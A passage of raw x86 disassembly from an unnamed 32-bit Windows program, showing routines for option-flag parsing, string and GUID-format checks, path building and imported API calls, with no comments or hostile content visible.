  404077:	mov    edx,DWORD PTR ds:0x40c42c
  40407d:	mov    edi,eax
  40407f:	add    edx,0x2
  404082:	mov    ecx,0x40b8c0
  404087:	add    edx,edi
  404089:	push   edx
  40408a:	call   0x408029
  40408f:	test   al,al
  404091:	jne    0x404098
  404093:	xor    eax,eax
  404095:	inc    eax
  404096:	jmp    0x4040d9
  404098:	mov    eax,ds:0x40b8c0
  40409d:	push   esi
  40409e:	mov    esi,DWORD PTR ds:0x40c42c
  4040a4:	mov    ecx,esi
  4040a6:	push   0x20
  4040a8:	pop    edx
  4040a9:	inc    esi
  4040aa:	mov    WORD PTR [eax+ecx*2],dx
  4040ae:	lea    edx,[edi+0x1]
  4040b1:	mov    eax,ds:0x40b8c0
  4040b6:	push   ebx
  4040b7:	mov    DWORD PTR ds:0x40c42c,esi
  4040bd:	lea    ecx,[eax+esi*2]
  4040c0:	call   0x4026d5
  4040c5:	test   eax,eax
  4040c7:	jns    0x4040ce
  4040c9:	xor    eax,eax
  4040cb:	inc    eax
  4040cc:	jmp    0x4040d8
  4040ce:	add    esi,edi
  4040d0:	xor    eax,eax
  4040d2:	mov    DWORD PTR ds:0x40c42c,esi
  4040d8:	pop    esi
  4040d9:	pop    edi
  4040da:	pop    ebx
  4040db:	ret    
  4040dc:	int3   
  4040dd:	int3   
  4040de:	int3   
  4040df:	int3   
  4040e0:	int3   
  4040e1:	int3   
  4040e2:	int3   
  4040e3:	int3   
  4040e4:	int3   
  4040e5:	int3   
  4040e6:	int3   
  4040e7:	int3   
  4040e8:	int3   
  4040e9:	int3   
  4040ea:	int3   
  4040eb:	int3   
  4040ec:	int3   
  4040ed:	int3   
  4040ee:	int3   
  4040ef:	int3   
  4040f0:	mov    edi,edi
  4040f2:	push   ebp
  4040f3:	mov    ebp,esp
  4040f5:	mov    ecx,DWORD PTR [ebp+0xc]
  4040f8:	test   ecx,ecx
  4040fa:	je     0x40410b
  4040fc:	cmp    WORD PTR [ecx],0x0
  404100:	je     0x40410b
  404102:	call   0x405351
  404107:	mov    ecx,eax
  404109:	jmp    0x404111
  40410b:	mov    ecx,DWORD PTR ds:0x40cba0
  404111:	mov    eax,ecx
  404113:	sub    eax,0x80000000
  404118:	neg    eax
  40411a:	sbb    eax,eax
  40411c:	and    eax,ecx
  40411e:	mov    ds:0x40cba0,eax
  404123:	xor    eax,eax
  404125:	pop    ebp
  404126:	ret    
  404127:	int3   
  404128:	int3   
  404129:	int3   
  40412a:	int3   
  40412b:	int3   
  40412c:	int3   
  40412d:	int3   
  40412e:	int3   
  40412f:	int3   
  404130:	mov    edi,edi
  404132:	push   ebp
  404133:	mov    ebp,esp
  404135:	mov    edx,DWORD PTR [ebp+0x8]
  404138:	push   ebx
  404139:	push   esi
  40413a:	push   edi
  40413b:	movzx  edi,WORD PTR [edx]
  40413e:	xor    esi,esi
  404140:	xor    ebx,ebx
  404142:	mov    eax,edi
  404144:	mov    ecx,esi
  404146:	inc    ebx
  404147:	mov    DWORD PTR ds:0x40b038,ecx
  40414d:	cmp    eax,0x52
  404150:	jg     0x40417e
  404152:	je     0x40419a
  404154:	test   eax,eax
  404156:	je     0x40416c
  404158:	cmp    eax,0x2b
  40415b:	je     0x404177
  40415d:	cmp    eax,0x42
  404160:	je     0x4041a2
  404162:	cmp    eax,0x46
  404165:	je     0x40419e
  404167:	cmp    eax,0x4e
  40416a:	jne    0x404192
  40416c:	or     ecx,0x2
  40416f:	mov    DWORD PTR ds:0x40c4c0,ebx
  404175:	jmp    0x4041a5
  404177:	mov    ecx,0x80
  40417c:	jmp    0x40416c
  40417e:	cmp    eax,0x62
  404181:	je     0x4041a2
  404183:	cmp    eax,0x66
  404186:	je     0x40419e
  404188:	cmp    eax,0x6e
  40418b:	je     0x40416c
  40418d:	cmp    eax,0x72
  404190:	je     0x40419a
  404192:	xor    eax,eax
  404194:	inc    eax
  404195:	jmp    0x404229
  40419a:	push   0x4
  40419c:	jmp    0x4041a4
  40419e:	push   0x5
  4041a0:	jmp    0x4041a4
  4041a2:	push   0x3
  4041a4:	pop    ecx
  4041a5:	mov    DWORD PTR ds:0x40b038,ecx
  4041ab:	test   di,di
  4041ae:	je     0x404227
  4041b0:	add    edx,0x2
  4041b3:	movzx  eax,WORD PTR [edx]
  4041b6:	test   ax,ax
  4041b9:	je     0x404227
  4041bb:	push   0x2b
  4041bd:	pop    edi
  4041be:	movzx  eax,ax
  4041c1:	lea    edx,[edx+0x2]
  4041c4:	cmp    ax,di
  4041c7:	jne    0x4041d7
  4041c9:	or     ecx,0x80
  4041cf:	mov    DWORD PTR ds:0x40b038,ecx
  4041d5:	jmp    0x404212
  4041d7:	cmp    eax,0x2d
  4041da:	jne    0x4041f9
  4041dc:	mov    eax,ecx
  4041de:	and    eax,0xffffff3f
  4041e3:	cmp    eax,0x3
  4041e6:	jne    0x40422e
  4041e8:	or     ecx,0x40
  4041eb:	mov    DWORD PTR ds:0x40c4c0,ebx
  4041f1:	mov    DWORD PTR ds:0x40b038,ecx
  4041f7:	jmp    0x404212
  4041f9:	push   0x21
  4041fb:	pop    edi
  4041fc:	cmp    di,ax
  4041ff:	jne    0x40420f
  404201:	mov    eax,ecx
  404203:	and    eax,0xffffff3f
  404208:	cmp    eax,0x3
  40420b:	jne    0x40422e
  40420d:	mov    esi,ebx
  40420f:	push   0x2b
  404211:	pop    edi
  404212:	movzx  eax,WORD PTR [edx]
  404215:	test   ax,ax
  404218:	jne    0x4041be
  40421a:	test   esi,esi
  40421c:	je     0x404227
  40421e:	or     ecx,0x20
  404221:	mov    DWORD PTR ds:0x40b038,ecx
  404227:	xor    eax,eax
  404229:	pop    edi
  40422a:	pop    esi
  40422b:	pop    ebx
  40422c:	pop    ebp
  40422d:	ret    
  40422e:	mov    eax,ebx
  404230:	jmp    0x404229
  404232:	int3   
  404233:	int3   
  404234:	int3   
  404235:	int3   
  404236:	int3   
  404237:	mov    edi,edi
  404239:	push   ebp
  40423a:	mov    ebp,esp
  40423c:	push   ecx
  40423d:	push   ebx
  40423e:	push   esi
  40423f:	mov    esi,DWORD PTR [ebp+0x8]
  404242:	xor    eax,eax
  404244:	mov    ebx,edx
  404246:	push   edi
  404247:	mov    DWORD PTR [esi],eax
  404249:	cmp    WORD PTR [ecx],ax
  40424c:	je     0x404290
  40424e:	movzx  edi,WORD PTR [ebx]
  404251:	xor    edx,edx
  404253:	mov    eax,ebx
  404255:	inc    edx
  404256:	test   di,di
  404259:	je     0x404281
  40425b:	movzx  edi,WORD PTR [ecx]
  40425e:	or     edi,0x20
  404261:	mov    DWORD PTR [ebp-0x4],edi
  404264:	movzx  edi,WORD PTR [ebx]
  404267:	cmp    di,WORD PTR [ebp-0x4]
  40426b:	je     0x40427c
  40426d:	add    eax,0x2
  404270:	add    edx,edx
  404272:	movzx  edi,WORD PTR [eax]
  404275:	test   di,di
  404278:	jne    0x404267
  40427a:	jmp    0x40427e
  40427c:	or     DWORD PTR [esi],edx
  40427e:	movzx  edi,WORD PTR [ebx]
  404281:	xor    edx,edx
  404283:	cmp    WORD PTR [eax],dx
  404286:	je     0x404299
  404288:	add    ecx,0x2
  40428b:	cmp    WORD PTR [ecx],dx
  40428e:	jne    0x404251
  404290:	xor    eax,eax
  404292:	pop    edi
  404293:	pop    esi
  404294:	pop    ebx
  404295:	mov    esp,ebp
  404297:	pop    ebp
  404298:	ret    
  404299:	push   0x57
  40429b:	pop    eax
  40429c:	jmp    0x404292
  40429e:	int3   
  40429f:	int3   
  4042a0:	int3   
  4042a1:	int3   
  4042a2:	int3   
  4042a3:	int3   
  4042a4:	int3   
  4042a5:	int3   
  4042a6:	int3   
  4042a7:	int3   
  4042a8:	int3   
  4042a9:	int3   
  4042aa:	int3   
  4042ab:	int3   
  4042ac:	int3   
  4042ad:	int3   
  4042ae:	int3   
  4042af:	int3   
  4042b0:	mov    edi,edi
  4042b2:	push   ebp
  4042b3:	mov    ebp,esp
  4042b5:	sub    esp,0x40
  4042b8:	mov    eax,ds:0x40b000
  4042bd:	xor    eax,ebp
  4042bf:	mov    DWORD PTR [ebp-0x4],eax
  4042c2:	mov    eax,DWORD PTR [ebp+0xc]
  4042c5:	mov    DWORD PTR [ebp-0x40],eax
  4042c8:	push   ebx
  4042c9:	push   esi
  4042ca:	push   edi
  4042cb:	mov    edi,DWORD PTR [ebp+0x8]
  4042ce:	mov    DWORD PTR [ebp-0x3c],edi
  4042d1:	test   eax,eax
  4042d3:	je     0x40441a
  4042d9:	xor    ecx,ecx
  4042db:	cmp    cx,WORD PTR [eax]
  4042de:	je     0x40441a
  4042e4:	push   0x401f00
  4042e9:	xor    ebx,ebx
  4042eb:	lea    ecx,[ebp-0x30]
  4042ee:	push   0x15
  4042f0:	mov    esi,ebx
  4042f2:	pop    edx
  4042f3:	mov    DWORD PTR [ebp-0x34],esi
  4042f6:	call   0x4026d5
  4042fb:	test   eax,eax
  4042fd:	js     0x40441a
  404303:	push   0x2a
  404305:	pop    eax
  404306:	push   0x2b
  404308:	mov    WORD PTR [ebp-0xe],ax
  40430c:	pop    eax
  40430d:	mov    WORD PTR [ebp-0xc],ax
  404311:	push   0x64
  404313:	pop    eax
  404314:	mov    WORD PTR [ebp-0xa],ax
  404318:	xor    eax,eax
  40431a:	mov    WORD PTR [ebp-0x8],ax
  40431e:	test   edi,edi
  404320:	je     0x404341
  404322:	cmp    WORD PTR [edi],bx
  404325:	je     0x404341
  404327:	lea    eax,[ebp-0x34]
  40432a:	mov    ecx,edi
  40432c:	push   eax
  40432d:	lea    edx,[ebp-0x30]
  404330:	call   0x404237
  404335:	pop    ecx
  404336:	test   eax,eax
  404338:	jne    0x40441a
  40433e:	mov    esi,DWORD PTR [ebp-0x34]
  404341:	xor    eax,eax
  404343:	mov    DWORD PTR [ebp-0x38],ebx
  404346:	inc    eax
  404347:	test   esi,0x40000
  40434d:	je     0x404352
  40434f:	mov    DWORD PTR [ebp-0x38],eax
  404352:	test   esi,0x10000
  404358:	je     0x40435c
  40435a:	mov    ebx,eax
  40435c:	test   esi,0x20000
  404362:	je     0x40436a
  404364:	or     esi,0x10fff
  40436a:	test   esi,esi
  40436c:	jne    0x404373
  40436e:	mov    esi,0x397
  404373:	and    esi,0xfff0ffff
  404379:	test   edi,edi
  40437b:	je     0x4043fc
  40437d:	xor    eax,eax
  40437f:	cmp    WORD PTR [edi],ax
  404382:	je     0x4043fc
  404384:	test   esi,esi
  404386:	jne    0x4043fc
  404388:	mov    edx,0x4012f8
  40438d:	mov    ecx,edi
  40438f:	mov    di,WORD PTR [ecx]
  404392:	cmp    di,WORD PTR [edx]
  404395:	mov    edi,DWORD PTR [ebp-0x3c]
  404398:	jne    0x4043be
  40439a:	cmp    WORD PTR [ecx],ax
  40439d:	je     0x4043c3
  40439f:	mov    di,WORD PTR [ecx+0x2]
  4043a3:	cmp    di,WORD PTR [edx+0x2]
  4043a7:	mov    WORD PTR [ebp-0x32],di
  4043ab:	mov    edi,DWORD PTR [ebp-0x3c]
  4043ae:	jne    0x4043be
  4043b0:	add    ecx,0x4
  4043b3:	add    edx,0x4
  4043b6:	cmp    WORD PTR [ebp-0x32],ax
  4043ba:	jne    0x40438f
  4043bc:	jmp    0x4043c3
  4043be:	sbb    eax,eax
  4043c0:	or     eax,0x1
  4043c3:	test   eax,eax
  4043c5:	je     0x4043f7
  4043c7:	push   0x4012fc
  4043cc:	push   edi
  4043cd:	call   DWORD PTR ds:0x40e0e4
  4043d3:	test   eax,eax
  4043d5:	je     0x4043f7
  4043d7:	push   0x401300
  4043dc:	push   edi
  4043dd:	call   DWORD PTR ds:0x40e0e4
  4043e3:	test   eax,eax
  4043e5:	je     0x4043f7
  4043e7:	push   0x401308
  4043ec:	push   edi
  4043ed:	call   DWORD PTR ds:0x40e0e4
  4043f3:	test   eax,eax
  4043f5:	jne    0x4043fc
  4043f7:	mov    esi,0x397
  4043fc:	neg    ebx
  4043fe:	sbb    ebx,ebx
  404400:	xor    eax,eax
  404402:	and    ebx,0x2
  404405:	cmp    DWORD PTR [ebp-0x38],eax
  404408:	setne  al
  40440b:	or     ebx,eax
  40440d:	push   ebx
  40440e:	push   DWORD PTR [ebp-0x40]
  404411:	push   esi
  404412:	call   DWORD PTR ds:0x40f02c
  404418:	jmp    0x40441d
  40441a:	xor    eax,eax
  40441c:	inc    eax
  40441d:	mov    ecx,DWORD PTR [ebp-0x4]
  404420:	pop    edi
  404421:	pop    esi
  404422:	xor    ecx,ebp
  404424:	pop    ebx
  404425:	call   0x409090
  40442a:	mov    esp,ebp
  40442c:	pop    ebp
  40442d:	ret    
  40442e:	int3   
  40442f:	int3   
  404430:	int3   
  404431:	int3   
  404432:	int3   
  404433:	int3   
  404434:	int3   
  404435:	int3   
  404436:	int3   
  404437:	int3   
  404438:	int3   
  404439:	int3   
  40443a:	int3   
  40443b:	int3   
  40443c:	int3   
  40443d:	int3   
  40443e:	int3   
  40443f:	int3   
  404440:	mov    DWORD PTR ds:0x40cc2c,0x1
  40444a:	xor    eax,eax
  40444c:	ret    
  40444d:	int3   
  40444e:	int3   
  40444f:	int3   
  404450:	int3   
  404451:	int3   
  404452:	int3   
  404453:	int3   
  404454:	int3   
  404455:	int3   
  404456:	int3   
  404457:	int3   
  404458:	int3   
  404459:	int3   
  40445a:	int3   
  40445b:	int3   
  40445c:	int3   
  40445d:	int3   
  40445e:	int3   
  40445f:	int3   
  404460:	mov    eax,0x8000
  404465:	ret    
  404466:	int3   
  404467:	int3   
  404468:	int3   
  404469:	int3   
  40446a:	int3   
  40446b:	mov    edi,edi
  40446d:	push   ebp
  40446e:	mov    ebp,esp
  404470:	sub    esp,0x210
  404476:	mov    eax,ds:0x40b000
  40447b:	xor    eax,ebp
  40447d:	mov    DWORD PTR [ebp-0x4],eax
  404480:	mov    eax,ds:0x40b038
  404485:	push   esi
  404486:	mov    esi,edx
  404488:	push   edi
  404489:	mov    edi,ecx
  40448b:	cmp    eax,0xffffffff
  40448e:	jne    0x40449e
  404490:	xor    eax,eax
  404492:	test   esi,esi
  404494:	sete   al
  404497:	lea    eax,[eax*2+0x3]
  40449e:	push   0x0
  4044a0:	push   eax
  4044a1:	call   DWORD PTR ds:0x40f014
  4044a7:	cmp    BYTE PTR ds:0x40cba8,0x0
  4044ae:	je     0x4044f4
  4044b0:	xor    eax,eax
  4044b2:	mov    DWORD PTR [ebp-0x210],0x104
  4044bc:	mov    WORD PTR [ebp-0x20c],ax
  4044c3:	lea    eax,[ebp-0x210]
  4044c9:	push   eax
  4044ca:	lea    eax,[ebp-0x20c]
  4044d0:	push   eax
  4044d1:	push   0x401310
  4044d6:	push   edi
  4044d7:	call   DWORD PTR ds:0x40f024
  4044dd:	cmp    WORD PTR [ebp-0x20c],0x0
  4044e5:	lea    ecx,[ebp-0x20c]
  4044eb:	jne    0x4044ef
  4044ed:	mov    ecx,edi
  4044ef:	call   0x405059
  4044f4:	push   DWORD PTR ds:0x40b8c0
  4044fa:	neg    esi
  4044fc:	sbb    esi,esi
  4044fe:	and    esi,0xfffffffd
  404501:	add    esi,0x5
  404504:	push   esi
  404505:	push   0x0
  404507:	push   edi
  404508:	call   DWORD PTR ds:0x40f020
  40450e:	cmp    BYTE PTR ds:0x40cba8,0x0
  404515:	mov    esi,eax
  404517:	je     0x404520
  404519:	mov    ecx,esi
  40451b:	call   0x405171
  404520:	test   esi,esi
  404522:	jne    0x404529
  404524:	mov    esi,0x8000
  404529:	mov    ecx,DWORD PTR [ebp-0x4]
  40452c:	mov    eax,esi
  40452e:	pop    edi
  40452f:	xor    ecx,ebp
  404531:	pop    esi
  404532:	call   0x409090
  404537:	mov    esp,ebp
  404539:	pop    ebp
  40453a:	ret    
  40453b:	int3   
  40453c:	int3   
  40453d:	int3   
  40453e:	int3   
  40453f:	int3   
  404540:	mov    edi,edi
  404542:	push   ebp
  404543:	mov    ebp,esp
  404545:	sub    esp,0x21c
  40454b:	mov    eax,ds:0x40b000
  404550:	xor    eax,ebp
  404552:	mov    DWORD PTR [ebp-0x4],eax
  404555:	mov    eax,ds:0x40b038
  40455a:	push   ebx
  40455b:	push   esi
  40455c:	mov    esi,DWORD PTR [ebp+0xc]
  40455f:	mov    DWORD PTR [ebp-0x21c],esi
  404565:	cmp    eax,0xffffffff
  404568:	jne    0x40456d
  40456a:	push   0x3
  40456c:	pop    eax
  40456d:	push   0x0
  40456f:	push   eax
  404570:	call   DWORD PTR ds:0x40f014
  404576:	mov    eax,DWORD PTR [ebp+0x8]
  404579:	xor    ebx,ebx
  40457b:	movzx  ecx,WORD PTR [eax]
  40457e:	mov    eax,ecx
  404580:	or     eax,0x20
  404583:	cmp    ax,0x75
  404587:	jne    0x404636
  40458d:	inc    ebx
  40458e:	push   edi
  40458f:	xor    edi,edi
  404591:	cmp    BYTE PTR ds:0x40cb9c,0x0
  404598:	je     0x40459b
  40459a:	inc    edi
  40459b:	movzx  eax,WORD PTR ds:0x40cba0
  4045a2:	push   edi
  4045a3:	push   0x0
  4045a5:	push   eax
  4045a6:	push   DWORD PTR ds:0x40b0b0
  4045ac:	push   ebx
  4045ad:	push   esi
  4045ae:	call   DWORD PTR ds:0x40f010
  4045b4:	mov    esi,eax
  4045b6:	cmp    esi,0x2
  4045b9:	jne    0x40461a
  4045bb:	lea    eax,[ebp-0x20c]
  4045c1:	mov    ecx,0x104
  4045c6:	mov    DWORD PTR [ebp-0x218],eax
  4045cc:	lea    eax,[ebp-0x218]
  4045d2:	mov    DWORD PTR [ebp-0x214],ecx
  4045d8:	mov    DWORD PTR [ebp-0x210],ecx
  4045de:	mov    ecx,DWORD PTR [ebp-0x21c]
  4045e4:	push   eax
  4045e5:	call   0x4037e5
  4045ea:	pop    ecx
  4045eb:	test   eax,eax
  4045ed:	je     0x40460f
  4045ef:	movzx  eax,WORD PTR ds:0x40cba0
  4045f6:	push   edi
  4045f7:	push   0x0
  4045f9:	push   eax
  4045fa:	push   DWORD PTR ds:0x40b0b0
  404600:	push   ebx
  404601:	push   DWORD PTR [ebp-0x218]
  404607:	call   DWORD PTR ds:0x40f010
  40460d:	mov    esi,eax
  40460f:	lea    ecx,[ebp-0x218]
  404615:	call   0x40809b
  40461a:	pop    edi
  40461b:	test   esi,esi
  40461d:	jne    0x404624
  40461f:	mov    esi,0x8000
  404624:	mov    eax,esi
  404626:	mov    ecx,DWORD PTR [ebp-0x4]
  404629:	pop    esi
  40462a:	xor    ecx,ebp
  40462c:	pop    ebx
  40462d:	call   0x409090
  404632:	mov    esp,ebp
  404634:	pop    ebp
  404635:	ret    
  404636:	test   cx,cx
  404639:	je     0x40458e
  40463f:	cmp    ax,0x6d
  404643:	je     0x40458e
  404649:	push   0x57
  40464b:	pop    eax
  40464c:	jmp    0x404626
  40464e:	int3   
  40464f:	int3   
  404650:	int3   
  404651:	int3   
  404652:	int3   
  404653:	mov    edi,edi
  404655:	push   ebp
  404656:	mov    ebp,esp
  404658:	sub    esp,0x240
  40465e:	mov    eax,ds:0x40b000
  404663:	xor    eax,ebp
  404665:	mov    DWORD PTR [ebp-0x4],eax
  404668:	push   ebx
  404669:	lea    eax,[ebp-0x230]
  40466f:	mov    DWORD PTR [ebp-0x238],0x104
  404679:	push   esi
  40467a:	mov    DWORD PTR [ebp-0x23c],eax
  404680:	mov    esi,edx
  404682:	mov    eax,ds:0x40b038
  404687:	mov    ebx,ecx
  404689:	mov    DWORD PTR [ebp-0x240],esi
  40468f:	push   edi
  404690:	cmp    eax,0xffffffff
  404693:	jne    0x404698
  404695:	mov    eax,DWORD PTR [ebp+0x8]
  404698:	push   0x0
  40469a:	push   eax
  40469b:	call   DWORD PTR ds:0x40f014
  4046a1:	cmp    WORD PTR ds:0x40cbc0,0x0
  4046a9:	je     0x40475c
  4046af:	push   0x9
  4046b1:	pop    ecx
  4046b2:	push   DWORD PTR [ebp-0x240]
  4046b8:	mov    esi,0x40132c
  4046bd:	lea    edi,[ebp-0x28]
  4046c0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c2:	mov    edi,DWORD PTR ds:0x40b8c0
  4046c8:	call   DWORD PTR ds:0x40e0ec
  4046ce:	push   edi
  4046cf:	mov    esi,eax
  4046d1:	call   DWORD PTR ds:0x40e0ec
  4046d7:	mov    edi,0x40cbc0
  4046dc:	add    esi,eax
  4046de:	push   edi
  4046df:	call   DWORD PTR ds:0x40e0ec
  4046e5:	add    esi,eax
  4046e7:	lea    eax,[ebp-0x28]
  4046ea:	push   eax
  4046eb:	call   DWORD PTR ds:0x40e0ec
  4046f1:	add    eax,0x2
  4046f4:	mov    ecx,0x40b8c0
  4046f9:	add    eax,esi
  4046fb:	push   eax
  4046fc:	call   0x408029
  404701:	test   al,al
  404703:	jne    0x40470a
  404705:	push   0xe
  404707:	pop    esi
  404708:	jmp    0x40473e
  40470a:	mov    edx,DWORD PTR ds:0x40b8c4
  404710:	lea    eax,[ebp-0x28]
  404713:	mov    ecx,DWORD PTR ds:0x40b8c0
  404719:	push   eax
  40471a:	call   0x40275f
  40471f:	test   eax,eax
  404721:	js     0x404739
  404723:	mov    edx,DWORD PTR ds:0x40b8c4
  404729:	mov    ecx,DWORD PTR ds:0x40b8c0
  40472f:	push   edi
  404730:	call   0x40275f
  404735:	test   eax,eax
  404737:	jns    0x404782
  404739:	mov    esi,0x65b
  40473e:	lea    ecx,[ebp-0x23c]
  404744:	call   0x40809b
  404749:	mov    ecx,DWORD PTR [ebp-0x4]
  40474c:	mov    eax,esi
  40474e:	pop    edi
  40474f:	pop    esi
  404750:	xor    ecx,ebp
  404752:	pop    ebx
  404753:	call   0x409090
  404758:	mov    esp,ebp
  40475a:	pop    ebp
  40475b:	ret    
  40475c:	mov    edi,DWORD PTR ds:0x40b8c0
  404762:	push   esi
  404763:	call   DWORD PTR ds:0x40e0ec
  404769:	push   edi
  40476a:	mov    esi,eax
  40476c:	call   DWORD PTR ds:0x40e0ec
  404772:	add    eax,0x2
  404775:	mov    ecx,0x40b8c0
  40477a:	add    eax,esi
  40477c:	push   eax
  40477d:	call   0x408029
  404782:	mov    edx,DWORD PTR ds:0x40b8c4
  404788:	mov    ecx,DWORD PTR ds:0x40b8c0
  40478e:	push   0x4012d4
  404793:	call   0x40275f
  404798:	test   eax,eax
  40479a:	js     0x404739
  40479c:	push   DWORD PTR [ebp-0x240]
  4047a2:	mov    edx,DWORD PTR ds:0x40b8c4
  4047a8:	mov    ecx,DWORD PTR ds:0x40b8c0
  4047ae:	call   0x40275f
  4047b3:	test   eax,eax
  4047b5:	js     0x404739
  4047b7:	push   DWORD PTR ds:0x40b8c0
  4047bd:	push   ebx
  4047be:	call   DWORD PTR ds:0x40f044
  4047c4:	mov    esi,eax
  4047c6:	cmp    esi,0x2
  4047c9:	jne    0x4047fd
  4047cb:	lea    eax,[ebp-0x23c]
  4047d1:	mov    DWORD PTR [ebp-0x234],0x104
  4047db:	push   eax
  4047dc:	mov    ecx,ebx
  4047de:	call   0x4037e5
  4047e3:	pop    ecx
  4047e4:	test   eax,eax
  4047e6:	je     0x4047fd
  4047e8:	push   DWORD PTR ds:0x40b8c0
  4047ee:	mov    ebx,DWORD PTR [ebp-0x23c]
  4047f4:	push   ebx
  4047f5:	call   DWORD PTR ds:0x40f044
  4047fb:	mov    esi,eax
  4047fd:	cmp    BYTE PTR ds:0x40cba8,0x0
  404804:	je     0x404814
  404806:	mov    ecx,ebx
  404808:	call   0x405059
  40480d:	mov    ecx,esi
  40480f:	call   0x405171
  404814:	test   esi,esi
  404816:	jne    0x40473e
  40481c:	mov    esi,0x8000
  404821:	jmp    0x40473e
  404826:	int3   
  404827:	int3   
  404828:	int3   
  404829:	int3   
  40482a:	int3   
  40482b:	mov    edi,edi
  40482d:	push   esi
  40482e:	mov    esi,ecx
  404830:	push   esi
  404831:	call   DWORD PTR ds:0x40e0ec
  404837:	cmp    eax,0x26
  40483a:	jne    0x404869
  40483c:	cmp    WORD PTR [esi],0x7b
  404840:	jne    0x404869
  404842:	push   0x2d
  404844:	pop    eax
  404845:	cmp    WORD PTR [esi+0x12],ax
  404849:	jne    0x404869
  40484b:	cmp    WORD PTR [esi+0x1c],ax
  40484f:	jne    0x404869
  404851:	cmp    WORD PTR [esi+0x26],ax
  404855:	jne    0x404869
  404857:	cmp    WORD PTR [esi+0x30],ax
  40485b:	jne    0x404869
  40485d:	cmp    WORD PTR [esi+0x4a],0x7d
  404862:	jne    0x404869
  404864:	xor    eax,eax
  404866:	inc    eax
  404867:	pop    esi
  404868:	ret    
  404869:	xor    eax,eax
  40486b:	pop    esi
  40486c:	ret    
  40486d:	int3   
  40486e:	int3   
  40486f:	int3   
  404870:	int3   
  404871:	int3   
  404872:	int3   
  404873:	int3   
  404874:	int3   
  404875:	int3   
  404876:	int3   
  404877:	int3   
  404878:	int3   
  404879:	int3   
  40487a:	int3   
  40487b:	int3   
  40487c:	int3   
  40487d:	int3   
  40487e:	int3   
  40487f:	int3   
  404880:	mov    edi,edi
  404882:	push   ebp
  404883:	mov    ebp,esp
  404885:	and    esp,0xfffffff8
  404888:	sub    esp,0x2c
  40488b:	mov    eax,ds:0x40b000
  404890:	xor    eax,esp
  404892:	mov    DWORD PTR [esp+0x28],eax
  404896:	push   ebx
  404897:	mov    ebx,DWORD PTR [ebp+0xc]
  40489a:	push   esi
  40489b:	push   edi
  40489c:	xor    edi,edi
  40489e:	inc    edi
  40489f:	cmp    DWORD PTR ds:0x40b038,0xffffffff
  4048a6:	jne    0x404911
  4048a8:	push   ecx
  4048a9:	lea    eax,[esp+0x2c]
  4048ad:	mov    DWORD PTR [esp+0x24],edi
  4048b1:	push   0x400
  4048b6:	lea    ecx,[esp+0x24]
  4048ba:	mov    DWORD PTR [esp+0x24],eax
  4048be:	call   0x407f90
  4048c3:	test   al,al
  4048c5:	jne    0x4048cc
  4048c7:	push   0xe
  4048c9:	pop    esi
  4048ca:	jmp    0x404902
  4048cc:	xor    esi,esi
  4048ce:	push   esi
  4048cf:	push   DWORD PTR [esp+0x24]
  4048d3:	push   DWORD PTR [esp+0x24]
  4048d7:	push   0x18
  4048d9:	push   0xffffffff
  4048db:	call   DWORD PTR ds:0x40f038
  4048e1:	test   eax,eax
  4048e3:	je     0x404908
  4048e5:	push   esi
  4048e6:	push   eax
  4048e7:	push   0x10004
  4048ec:	push   esi
  4048ed:	push   DWORD PTR [esp+0x2c]
  4048f1:	push   esi
  4048f2:	call   DWORD PTR ds:0x40f030
  4048f8:	cmp    eax,0x6
  4048fb:	je     0x404908
  4048fd:	mov    esi,0x642
  404902:	lea    ecx,[esp+0x1c]
  404906:	jmp    0x404987
  404908:	lea    ecx,[esp+0x1c]
  40490c:	call   0x407f6a
  404911:	push   ecx
  404912:	lea    eax,[esp+0x1c]
  404916:	mov    DWORD PTR [esp+0x14],edi
  40491a:	push   0x27
  40491c:	lea    ecx,[esp+0x14]
  404920:	mov    DWORD PTR [esp+0x14],eax
  404924:	call   0x407f90
  404929:	test   al,al
  40492b:	jne    0x404932
  40492d:	push   0xe
  40492f:	pop    esi
  404930:	jmp    0x404983
  404932:	mov    ecx,ebx
  404934:	call   0x40482b
  404939:	test   al,al
  40493b:	je     0x404963
  40493d:	mov    edx,DWORD PTR [esp+0x10]
  404941:	mov    ecx,DWORD PTR [esp+0xc]
  404945:	push   ebx
  404946:	call   0x4026d5
  40494b:	test   eax,eax
  40494d:	jns    0x404956
  40494f:	mov    esi,0x65b
  404954:	jmp    0x404983
  404956:	mov    ecx,DWORD PTR [esp+0xc]
  40495a:	mov    edx,edi
  40495c:	call   0x40446b
  404961:	jmp    0x404981
  404963:	push   0x5
  404965:	pop    ecx
  404966:	mov    esi,0x401350
  40496b:	lea    edi,[esp+0x1c]
  40496f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404971:	push   0x3
  404973:	lea    edx,[esp+0x20]
  404977:	mov    ecx,ebx
  404979:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40497b:	call   0x404653
  404980:	pop    ecx
  404981:	mov    esi,eax
  404983:	lea    ecx,[esp+0xc]
  404987:	call   0x407f6a
  40498c:	mov    ecx,DWORD PTR [esp+0x34]
  404990:	mov    eax,esi
  404992:	pop    edi
  404993:	pop    esi
  404994:	pop    ebx
  404995:	xor    ecx,esp
  404997:	call   0x409090
  40499c:	mov    esp,ebp
  40499e:	pop    ebp
  40499f:	ret    
  4049a0:	int3   
  4049a1:	int3   
  4049a2:	int3   
  4049a3:	int3   
  4049a4:	int3   
  4049a5:	int3   
  4049a6:	int3   
  4049a7:	int3   
  4049a8:	int3   
  4049a9:	int3   
  4049aa:	int3   
  4049ab:	int3   
  4049ac:	int3   
  4049ad:	int3   
  4049ae:	int3   
  4049af:	int3   
  4049b0:	mov    edi,edi
  4049b2:	push   ebp
  4049b3:	mov    ebp,esp
  4049b5:	sub    esp,0x20
  4049b8:	mov    eax,ds:0x40b000
  4049bd:	xor    eax,ebp
  4049bf:	mov    DWORD PTR [ebp-0x4],eax
  4049c2:	push   esi
  4049c3:	push   edi
  4049c4:	mov    eax,DWORD PTR [ebp+0xc]
  4049c7:	lea    edi,[ebp-0x20]
  4049ca:	push   0x6
  4049cc:	pop    ecx
  4049cd:	mov    esi,0x401368
  4049d2:	lea    edx,[ebp-0x20]
  4049d5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049d7:	push   0x5
  4049d9:	mov    ecx,eax
  4049db:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4049dd:	call   0x404653
  4049e2:	pop    ecx
  4049e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4049e6:	pop    edi
  4049e7:	xor    ecx,ebp
  4049e9:	pop    esi
  4049ea:	call   0x409090
  4049ef:	mov    esp,ebp
